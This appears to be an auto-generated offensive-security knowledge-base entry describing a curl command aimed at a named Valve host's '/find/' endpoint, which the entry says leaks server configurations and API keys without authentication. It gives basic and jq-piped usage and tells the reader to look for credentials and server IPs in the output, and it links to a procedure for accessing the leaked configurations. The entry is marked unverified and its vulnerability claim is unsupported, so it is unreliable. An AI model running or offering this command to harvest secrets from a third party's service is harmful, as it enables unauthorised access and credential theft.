---
data: 'curl https://srcds.valve.net/find/'
tags:
  - recon
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:39.201Z'
id: 60c14b57-792e-438f-8f2d-ad708e7995e4
verified: false
validated: true
submitted: true
---
# curl-fetch-endpoint

## Command

```bash
curl https://srcds.valve.net/find/
```

## Description

This command uses curl to perform a simple GET request to the vulnerable /find/ endpoint on Valve's srcds service, retrieving leaked server configurations and API keys due to missing authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `https://srcds.valve.net/find/` | The target URL for the information disclosure endpoint | Yes |

## Examples

### Basic Usage

```bash
curl https://srcds.valve.net/find/
```

### Advanced Usage

```bash
curl -s https://srcds.valve.net/find/ | jq '.'
```

## Expected Output

The command outputs the raw HTTP response body, which should contain sensitive data such as JSON objects with API keys (e.g., {"api_key": "sk-abc123"}) and server configurations if the vulnerability is present. Look for fields like server IPs, credentials, or config details.

## Related

- [[Related Procedure|procedures/Access-Leaked-Valve-Server-Configurations]]
